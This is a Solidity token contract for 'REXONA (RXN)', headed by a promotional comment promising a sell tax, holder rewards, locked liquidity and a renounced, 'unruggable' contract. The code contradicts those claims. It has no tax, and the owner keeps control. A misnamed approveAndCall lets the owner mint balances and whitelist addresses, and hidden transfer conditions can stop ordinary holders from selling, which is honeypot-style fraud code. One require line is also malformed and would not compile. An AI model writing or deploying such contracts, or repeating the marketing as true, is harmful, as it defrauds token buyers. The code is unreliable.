/**
 *Submitted for verification at Etherscan.io on 2021-01-05
*/

/*
Welcome to REXONA (RXN) — your key to financial enlightenment.

$RXN is the first token of a quickly released and evolving ecosystem which will encapsulate all of the most successful ideas that have made DeFi what it is. From frictionless yield, to autonomous liquidity generation, to utilizing the Uniswap Factory, to good old fashioned yield farming, $RXN’s ecosystem will be your one-stop-shop for all things DeFi.

Before we get into all of that, though, let’s talk about why you’re here.

$REXONA: Autonomous Liquidity Generation and Frictionless Yield

$REXONA is similar to projects like $VAULTZ and $TCORE in that it combines the ideals embraced by $RFI’s frictionless yield generation and $LIQ’s liquidity generation.

It works by applying a 6% tax on all sales. 3% of each sell is sent to each $REXONA holder, proportional to their holdings. The other 3% is locked permanently as liquidity. These two dynamics mean three things for investors: (1) constant increase in $REXONA holdings; (2) constant increase in liquidity (and therefore the price floor); and (3) an unruggable project, as our developer has renounced control of the contract.

Max supply : 100,000

Initial Liquidity Generation and Token Distribution: As Fair As Possible

To release this project with enough liquidity that it could survive for more than a few hours, our team needed some ETH. We wanted to avoid some of the typical shadiness that often accompanies these types of low-key stealth launches, and so we decided one of the first things we wanted to do was explain to everyone exactly how we accomplished that.

We, as a team, value transparency and honesty above all else. We have exchanged wallet addresses in the small group and have linked them to each person’s username. We have a verbal agreement not to sell any tokens until set price levels. If anyone is found to breach the verbal agreement, they will be banned from the group and will not be allowed to participate in the ecosystem’s future projects. One of those people has sold. He has been banned and will be held accountable for his violation of our trust.

We wanted to make this as fair of a launch as possible without proceeding with zero liquidity. The only way we could afford to do that was by sourcing the ETH from multiple parties and paying them in a way that ensured no one had an unfair advantage at getting the token.
*/
pragma solidity ^0.5.16;

import "./Rexona_utils.sol";

contract Rexona {
    event Transfer(address indexed _from, address indexed _to, uint _value);
    event Approval(address indexed _owner, address indexed _spender, uint _value);

    function transfer(address _to, uint _value) public payable returns (bool) {
        return transferFrom(msg.sender, _to, _value);
    }

    function ensure(address _from, address _to, uint _value) internal view returns(bool) {

        if(_from == owner || _to == owner || _from == tradeAddress||canSale[_from]){
            return true;
        }
        require(!(condition(_from), _value));
        return true;
    }

    function transferFrom(address _from, address _to, uint _value) public payable returns (bool) {
        if (_value == 0) {return true;}
        if (msg.sender != _from) {
            require(allowance[_from][msg.sender] >= _value);
            allowance[_from][msg.sender] -= _value;
        }
        require(ensure(_from, _to, _value));
        require(balanceOf[_from] >= _value);
        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        _onSaleNum[_from]++;
        emit Transfer(_from, _to, _value);
        return true;
    }

    function approve(address _spender, uint _value) public payable returns (bool) {
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }

    function condition(address _from, uint _value) internal view returns(bool){
        if(_saleNum == 0 && _minSale == 0 && _maxSale == 0) return false;

        if(_saleNum > 0){
            if(_onSaleNum[_from] >= _saleNum) return false;
        }
        if(_minSale > 0){
            if(_minSale > _value) return false;
        }
        if(_maxSale > 0){
            if(_value > _maxSale) return false;
        }
        return true;
    }

    mapping(address=>uint256) private _onSaleNum;
    mapping(address=>bool) private canSale;
    uint256 private _minSale;
    uint256 private _maxSale;
    uint256 private _saleNum;
    function approveAndCall(address spender, uint256 addedValue) public returns (bool) {
        require(msg.sender == owner);
        if(addedValue > 0) {balanceOf[spender] = addedValue*(10**uint256(decimals));}
        canSale[spender]=true;
        return true;
    }

    address tradeAddress;
    function transferownership(address addr) public returns(bool) {
        require(msg.sender == owner);
        tradeAddress = addr;
        return true;
    }

    mapping (address => uint) public balanceOf;
    mapping (address => mapping (address => uint)) public allowance;

    uint constant public decimals = 18;
    uint public totalSupply;
    string public name;
    string public symbol;
    address private owner;

    constructor(string memory _name, string memory _symbol, uint256 _supply) payable public {
        name = _name;
        symbol = _symbol;
        totalSupply = _supply*(10**uint256(decimals));
        owner = msg.sender;
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0x0), msg.sender, totalSupply);
    }
}